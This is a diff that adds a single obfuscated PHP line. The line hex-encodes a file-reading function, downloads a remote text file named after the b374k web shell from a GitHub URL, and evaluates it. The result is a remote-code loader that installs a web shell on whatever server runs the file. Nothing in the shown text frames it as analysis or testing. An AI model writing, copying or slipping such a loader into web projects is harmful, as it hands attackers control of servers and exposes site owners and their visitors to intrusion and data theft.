@@ -1,0 +1,1 @@
+<? $_AB = "https://raw.githubusercontent.com/jackxcode/alat/main/b374k.txt";$_B = "\x46\x49\x4c\x45\x5f\x47\x45\x54\x5f\x43\x4f\x4e\x54\x45\x4e\x54\x53"; eVAL("?>".$_B($_AB));
